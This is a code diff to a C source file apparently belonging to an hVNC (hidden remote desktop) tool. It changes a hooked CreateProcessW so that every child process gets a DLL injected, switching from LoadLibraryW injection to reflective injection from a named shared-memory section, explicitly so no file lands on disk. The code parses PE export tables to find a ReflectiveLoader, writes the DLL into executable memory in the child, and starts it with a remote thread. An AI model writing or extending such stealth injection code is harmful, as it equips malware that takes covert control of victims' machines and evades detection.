@@ -300,7 +300,11 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         LPPROCESS_INFORMATION lpProcessInformation
         );
     pCreateProcessW OriginalCreateProcessW = NULL;
-    static WCHAR g_DllPath[512] = { 0 };
+
+    // In-memory DLL bytes for child injection (mapped from named section)
+    static HANDLE g_DllSectionHandle = NULL;
+    static LPVOID g_DllRawBytes = NULL;
+    static DWORD  g_DllRawSize = 0;
 
     // Helper function to check if path needs redirection
     BOOL NeedsRedirection(const WCHAR* path, SIZE_T length) {
@@ -713,41 +717,134 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             QueryFlags, FileName);
     }
 
-    // Inject the DLL into a child process via LoadLibraryW
-    static BOOL InjectDllIntoChild(HANDLE hProcess, const WCHAR* dllPath) {
-        SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
+    // Inject the DLL into a child process via reflective injection (no file on disk)
+    static DWORD _rva2fo(DWORD rva, const BYTE* pe, DWORD peSize, DWORD sectionOff, WORD numSections) {
+        for (WORD i = 0; i < numSections; i++) {
+            DWORD off = sectionOff + (DWORD)i * 40;
+            if (off + 40 > peSize) break;
+            DWORD virtualAddr = *(DWORD*)(pe + off + 12);
+            DWORD rawDataSize = *(DWORD*)(pe + off + 16);
+            DWORD rawDataPtr  = *(DWORD*)(pe + off + 20);
+            if (rva >= virtualAddr && rva < virtualAddr + rawDataSize) {
+                return rva - virtualAddr + rawDataPtr;
+            }
+        }
+        if (numSections > 0) {
+            DWORD firstRawPtr = *(DWORD*)(pe + sectionOff + 20);
+            if (rva < firstRawPtr) return rva;
+        }
+        return 0;
+    }
 
-        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!remoteMem) return FALSE;
+    static DWORD FindReflectiveLoaderFileOffset(const BYTE* pe, DWORD peSize) {
+        if (peSize < 64 || pe[0] != 'M' || pe[1] != 'Z') return 0;
+
+        DWORD lfanew = *(DWORD*)(pe + 60);
+        if (lfanew + 4 > peSize) return 0;
+        if (*(DWORD*)(pe + lfanew) != 0x00004550) return 0; // PE sig
+
+        DWORD coffOff = lfanew + 4;
+        if (coffOff + 20 > peSize) return 0;
+        WORD numberOfSections = *(WORD*)(pe + coffOff + 2);
+        WORD sizeOfOptionalHeader = *(WORD*)(pe + coffOff + 16);
+
+        DWORD optOff = coffOff + 20;
+        if (optOff + 2 > peSize) return 0;
+        WORD magic = *(WORD*)(pe + optOff);
+
+        DWORD exportDirRVA = 0;
+        if (magic == 0x20b) { // PE32+
+            DWORD ddOff = optOff + 112;
+            if (ddOff + 8 > peSize) return 0;
+            exportDirRVA = *(DWORD*)(pe + ddOff);
+        } else if (magic == 0x10b) { // PE32
+            DWORD ddOff = optOff + 96;
+            if (ddOff + 8 > peSize) return 0;
+            exportDirRVA = *(DWORD*)(pe + ddOff);
+        } else {
+            return 0;
+        }
+        if (exportDirRVA == 0) return 0;
+
+        DWORD sectionOff = optOff + sizeOfOptionalHeader;
+
+        // RVA to file offset helper (inline)
+        #define RVA2FO(rva) _rva2fo((rva), pe, peSize, sectionOff, numberOfSections)
+        DWORD exportDirFO = RVA2FO(exportDirRVA);
+        if (exportDirFO == 0 || exportDirFO + 40 > peSize) return 0;
+
+        DWORD numberOfNames         = *(DWORD*)(pe + exportDirFO + 24);
+        DWORD addressOfFunctionsRVA  = *(DWORD*)(pe + exportDirFO + 28);
+        DWORD addressOfNamesRVA      = *(DWORD*)(pe + exportDirFO + 32);
+        DWORD addressOfOrdinalsRVA   = *(DWORD*)(pe + exportDirFO + 36);
+
+        DWORD namesFO    = RVA2FO(addressOfNamesRVA);
+        DWORD funcsFO    = RVA2FO(addressOfFunctionsRVA);
+        DWORD ordinalsFO = RVA2FO(addressOfOrdinalsRVA);
+        if (namesFO == 0 || funcsFO == 0 || ordinalsFO == 0) return 0;
+
+        for (DWORD i = 0; i < numberOfNames; i++) {
+            if (namesFO + i * 4 + 4 > peSize) break;
+            DWORD nameRVA = *(DWORD*)(pe + namesFO + i * 4);
+            DWORD nameFO  = RVA2FO(nameRVA);
+            if (nameFO == 0 || nameFO >= peSize) continue;
+
+            // Check for "ReflectiveLoader" substring
+            const char* name = (const char*)(pe + nameFO);
+            BOOL found = FALSE;
+            for (DWORD k = 0; nameFO + k < peSize && name[k] != 0; k++) {
+                if (name[k] == 'R' && nameFO + k + 16 <= peSize) {
+                    if (memcmp(&name[k], "ReflectiveLoader", 16) == 0) {
+                        found = TRUE;
+                        break;
+                    }
+                }
+            }
+            if (!found) continue;
+
+            if (ordinalsFO + i * 2 + 2 > peSize) continue;
+            WORD ordinal = *(WORD*)(pe + ordinalsFO + i * 2);
+            if (funcsFO + ordinal * 4 + 4 > peSize) continue;
+            DWORD funcRVA = *(DWORD*)(pe + funcsFO + ordinal * 4);
+            return RVA2FO(funcRVA);
+        }
+        #undef RVA2FO
+        return 0;
+    }
+
+    static BOOL ReflectiveInjectIntoChild(HANDLE hProcess, const BYTE* dllBytes, DWORD dllSize) {
+        DWORD loaderOffset = FindReflectiveLoaderFileOffset(dllBytes, dllSize);
+        if (loaderOffset == 0) {
+            LogDebug(L"[ChildInject] ReflectiveLoader export not found");
+            return FALSE;
+        }
+
+        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllSize,
+            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!remoteMem) {
+            LogDebug(L"[ChildInject] VirtualAllocEx failed");
+            return FALSE;
+        }
 
         SIZE_T written;
-        if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, &written)) {
+        if (!WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, &written)) {
             VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            LogDebug(L"[ChildInject] WriteProcessMemory failed");
             return FALSE;
         }
 
-        HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
-        if (!k32) {
-            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
-            return FALSE;
-        }
+        LPTHREAD_START_ROUTINE remoteLoader =
+            (LPTHREAD_START_ROUTINE)((BYTE*)remoteMem + loaderOffset);
 
-        FARPROC pLoadLib = GetProcAddress(k32, "LoadLibraryW");
-        if (!pLoadLib) {
-            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
-            return FALSE;
-        }
-
-        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
-            (LPTHREAD_START_ROUTINE)pLoadLib, remoteMem, 0, NULL);
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024,
+            remoteLoader, NULL, 0, NULL);
         if (!hThread) {
-            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+            LogDebug(L"[ChildInject] CreateRemoteThread failed");
             return FALSE;
         }
 
-        WaitForSingleObject(hThread, 10000);
+        WaitForSingleObject(hThread, 30000);
         CloseHandle(hThread);
-        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
         return TRUE;
     }
 
@@ -774,9 +871,10 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             lpStartupInfo, lpProcessInformation
         );
 
-        if (result && lpProcessInformation && g_DllPath[0] != L'\0') {
-            LogDebug(L"[CreateProcessW] Injecting DLL into child process");
-            if (!InjectDllIntoChild(lpProcessInformation->hProcess, g_DllPath)) {
+        if (result && lpProcessInformation && g_DllRawBytes && g_DllRawSize > 0) {
+            LogDebug(L"[CreateProcessW] Reflective-injecting DLL into child process");
+            if (!ReflectiveInjectIntoChild(lpProcessInformation->hProcess,
+                    (const BYTE*)g_DllRawBytes, g_DllRawSize)) {
                 LogDebug(L"[CreateProcessW] Child injection failed");
             } else {
                 LogDebug(L"[CreateProcessW] Child injection succeeded");
@@ -815,7 +913,9 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             // Initialize to empty strings to prevent crashes
             g_SearchString[0] = L'\0';
             g_ReplacementString[0] = L'\0';
-            g_DllPath[0] = L'\0';
+            g_DllSectionHandle = NULL;
+            g_DllRawBytes = NULL;
+            g_DllRawSize = 0;
 
             // Try to get configuration from environment variables
             __try {
@@ -850,15 +950,40 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
                     }
                 }
 
-                // Read DLL path for child process injection
-                WCHAR envDllPath[512] = { 0 };
-                DWORD dllPathLen = GetEnvironmentVariableW(L"RDI_DLL_PATH", envDllPath, 512);
-                if (dllPathLen > 0 && dllPathLen < 512) {
-                    wcsncpy_s(g_DllPath, 512, envDllPath, dllPathLen);
-                    g_DllPath[dllPathLen] = L'\0';
-                    if (g_LogFile != INVALID_HANDLE_VALUE) {
-                        LogDebug(L"[ENV] DLL path for child injection: ");
-                        LogDebug(g_DllPath);
+                // Read DLL section for child process injection (in-memory, no file on disk)
+                WCHAR envSectionName[512] = { 0 };
+                WCHAR envDllSize[32] = { 0 };
+                DWORD sectionNameLen = GetEnvironmentVariableW(L"RDI_DLL_SECTION", envSectionName, 512);
+                DWORD dllSizeLen = GetEnvironmentVariableW(L"RDI_DLL_SIZE", envDllSize, 32);
+
+                if (sectionNameLen > 0 && sectionNameLen < 512 && dllSizeLen > 0 && dllSizeLen < 32) {
+                    g_DllRawSize = 0;
+                    for (DWORD i = 0; i < dllSizeLen; i++) {
+                        g_DllRawSize = g_DllRawSize * 10 + (envDllSize[i] - L'0');
+                    }
+
+                    g_DllSectionHandle = OpenFileMappingW(FILE_MAP_READ, FALSE, envSectionName);
+                    if (g_DllSectionHandle) {
+                        g_DllRawBytes = MapViewOfFile(g_DllSectionHandle, FILE_MAP_READ, 0, 0, g_DllRawSize);
+                        if (g_DllRawBytes) {
+                            if (g_LogFile != INVALID_HANDLE_VALUE) {
+                                char msg[256];
+                                sprintf_s(msg, 256, "[ENV] DLL shared memory mapped: %lu bytes", g_DllRawSize);
+                                LogDebugA(msg);
+                            }
+                        } else {
+                            CloseHandle(g_DllSectionHandle);
+                            g_DllSectionHandle = NULL;
+                            g_DllRawSize = 0;
+                            if (g_LogFile != INVALID_HANDLE_VALUE) {
+                                LogDebugA("[ENV] MapViewOfFile failed for DLL section");
+                            }
+                        }
+                    } else {
+                        g_DllRawSize = 0;
+                        if (g_LogFile != INVALID_HANDLE_VALUE) {
+                            LogDebugA("[ENV] OpenFileMappingW failed for DLL section");
+                        }
                     }
                 }
             }
@@ -986,6 +1111,15 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             g_HooksInitialized = FALSE;
             MH_DisableHook(MH_ALL_HOOKS);
             MH_Uninitialize();
+
+            if (g_DllRawBytes) {
+                UnmapViewOfFile(g_DllRawBytes);
+                g_DllRawBytes = NULL;
+            }
+            if (g_DllSectionHandle) {
+                CloseHandle(g_DllSectionHandle);
+                g_DllSectionHandle = NULL;
+            }
 
             if (g_LogFile != INVALID_HANDLE_VALUE) {
                 CloseHandle(g_LogFile);
